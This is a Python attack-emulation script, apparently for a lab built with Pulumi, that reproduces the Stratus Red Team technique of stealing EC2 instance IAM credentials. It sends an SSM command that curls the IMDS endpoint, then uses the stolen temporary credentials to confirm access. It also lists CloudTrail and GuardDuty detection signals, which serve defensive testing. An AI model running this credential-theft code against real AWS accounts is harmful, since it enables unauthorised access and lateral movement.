"""
Technique : aws.credential-access.ec2-steal-instance-credentials
Tactic    : Credential Access (T1552.005)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-steal-instance-credentials/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the EC2 instance with IAM role.
  - Wait ~2-3 minutes after `pulumi up` for the instance to register in SSM.

How the attack works:
  An attacker who has compromised AWS credentials with ssm:SendCommand can use
  SSM to run a shell command on an EC2 instance that curls the IMDS endpoint,
  retrieving the temporary IAM role credentials attached to that instance.
  These credentials can then be used from outside AWS to exfiltrate data or
  move laterally — GuardDuty detects the credentials being used from an
  unexpected source IP.

Detection signal:
  - ssm:SendCommand executing curl against 169.254.169.254.
  - GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration
    when stolen creds are used outside the instance's IP.

Revert:
  - None (credentials expire naturally, instance left intact for pulumi destroy).
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

SSM_WAIT_TIMEOUT_S  = 180
COMMAND_TIMEOUT_S   = 60


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def wait_for_ssm(ssm_client, instance_id: str, timeout_s: int) -> bool:
    print(f"  Waiting up to {timeout_s}s for {instance_id} to register in SSM...")
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        resp = ssm_client.describe_instance_information(
            Filters=[{"Key": "InstanceIds", "Values": [instance_id]}]
        )
        infos = resp.get("InstanceInformationList", [])
        if infos and infos[0].get("PingStatus") == "Online":
            print(f"  [+] Instance is Online in SSM.")
            return True
        time.sleep(15)
    print(f"  [!] Timed out waiting for SSM registration.")
    return False


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    instance_id = infra.get("instance_id", "")
    role_name   = infra.get("role_name",   "")

    if not instance_id:
        print("[!] instance_id not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session    = boto3.Session()
    ssm_client = session.client("ssm")
    sts_client = session.client("sts")

    # ── Step 1: Wait for SSM registration ────────────────────────────────────
    banner("Step 1 — Wait for SSM agent registration")
    if not wait_for_ssm(ssm_client, instance_id, SSM_WAIT_TIMEOUT_S):
        return

    # ── Step 2: Steal credentials via IMDS ───────────────────────────────────
    banner("Step 2 — Steal IAM credentials via IMDS (SendCommand)")
    # First get the role name from IMDS, then retrieve the credentials
    imds_cmd = (
        "ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/); "
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
    )
    try:
        send_resp = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={"commands": [imds_cmd]},
            Comment="Stratus Red Team — steal IMDS credentials",
        )
        command_id = send_resp["Command"]["CommandId"]
        print(f"  [+] Command sent: {command_id}")
        print(f"  [!] CloudTrail event: ssm:SendCommand")
    except ClientError as exc:
        print(f"  [!] SendCommand failed: {exc}")
        return

    # ── Step 3: Get command output ────────────────────────────────────────────
    banner("Step 3 — Retrieve command output (GetCommandInvocation)")
    deadline = time.time() + COMMAND_TIMEOUT_S
    output = ""
    while time.time() < deadline:
        time.sleep(5)
        try:
            inv_resp = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
            )
            status = inv_resp["Status"]
            if status in ("Success", "Failed", "Cancelled", "TimedOut"):
                output = inv_resp.get("StandardOutputContent", "")
                print(f"  [+] Command status: {status}")
                break
            print(f"  [~] Status: {status} — waiting...")
        except ClientError as exc:
            if exc.response["Error"]["Code"] == "InvocationDoesNotExist":
                time.sleep(5)
            else:
                print(f"  [!] GetCommandInvocation failed: {exc}")
                break

    if output:
        print(f"\n  Raw IMDS credential output:")
        print(f"  {'─' * 50}")
        try:
            creds_json = json.loads(output.strip())
            # Parse and use the stolen credentials
            stolen_session = boto3.Session(
                aws_access_key_id=creds_json.get("AccessKeyId"),
                aws_secret_access_key=creds_json.get("SecretAccessKey"),
                aws_session_token=creds_json.get("Token"),
            )
            stolen_sts = stolen_session.client("sts")

            banner("Step 4 — Prove access with stolen credentials (GetCallerIdentity)")
            identity = stolen_sts.get_caller_identity()
            print(f"  [+] CREDENTIALS SUCCESSFULLY STOLEN!")
            print(f"  [+] AccessKeyId : {creds_json.get('AccessKeyId')}")
            print(f"  [+] Expiration  : {creds_json.get('Expiration')}")
            print(f"  [+] Identity    : {identity.get('Arn')}")
            print(f"  [!] GuardDuty may alert: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration")
        except (json.JSONDecodeError, KeyError, ClientError) as exc:
            print(f"  Raw output: {output[:500]}")
            print(f"  [~] Could not parse/use credentials: {exc}")
    else:
        print("  [~] No output from IMDS curl command.")

    banner("Complete")
    print("CloudTrail events: ssm:SendCommand, ssm:GetCommandInvocation, sts:GetCallerIdentity")
    print("\nDetection guidance:")
    print("  Alert on ssm:SendCommand containing 'metadata' or '169.254.169.254'.")
    print("  GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration")
    print("  when stolen credentials are used from an unexpected IP.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the EC2 instance.")


if __name__ == "__main__":
    main()
